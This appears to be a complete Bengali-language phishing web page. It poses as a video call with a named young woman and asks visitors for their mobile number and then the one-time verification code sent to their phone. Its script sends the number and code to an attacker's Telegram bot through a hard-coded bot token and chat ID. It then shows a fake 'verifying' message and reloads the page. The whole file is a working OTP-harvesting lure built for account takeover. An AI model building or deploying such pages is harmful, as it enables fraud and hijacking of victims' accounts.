<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Call</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background: #f4f4f4; padding-top: 50px; }
        .box { background: #fff; width: 90%; max-width: 400px; margin: auto; padding: 20px; border-radius: 15px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        img { width: 80px; height: 80px; border-radius: 50%; object-fit: cover; }
        input { width: 90%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
        button { width: 95%; padding: 15px; background: #e1306c; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="box" id="step1">
    <img src="ssstik.io_1777744992501.jpeg">
    <h3>Sumaiya Akter Jui</h3>
    <p>নম্বর দিয়ে ভিডিও কল শুরু করুন</p>
    <input type="tel" id="num" placeholder="মোবাইল নম্বর লিখুন">
    <button onclick="next()">পরবর্তী ধাপ</button>
</div>

<div class="box" id="step2" style="display:none;">
    <img src="ssstik.io_1777744992501.jpeg">
    <h3>কোড যাচাই করুন</h3>
    <p>আপনার মোবাইলে পাঠানো কোডটি লিখুন</p>
    <input type="tel" id="otp" placeholder="৪ ডিজিট কোড">
    <button onclick="sendData()">ভিডিও কল শুরু করুন</button>
</div>

<script>
    let phone = "";
    function next() {
        phone = document.getElementById('num').value;
        if(phone.length < 5) return alert("নম্বর দিন");
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
    }

    function sendData() {
        const otp = document.getElementById('otp').value;
        if(otp.length < 4) return alert("কোড দিন");

        // আপনার সঠিক তথ্য (স্ক্রিনশট অনুযায়ী)
        const token = "8512100128:AAGk_HAlgp8deEn7wuRUtHE90Ev234DN1lE"; 
        const chat_id = "8795859465"; 

        const text = `🔴 নতুন ডাটা আইছে!\n👤 নাম: Sumaiya Akter Jui\n📱 নম্বর: ${phone}\n🔑 ওটিপি: ${otp}`;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;

        fetch(url)
        .then(() => {
            alert("যাচাই করা হচ্ছে... একটু অপেক্ষা করুন।");
            location.reload();
        })
        .catch(() => alert("সমস্যা হয়েছে, আবার চেষ্টা করুন।"));
    }
</script>
</body>
</html>
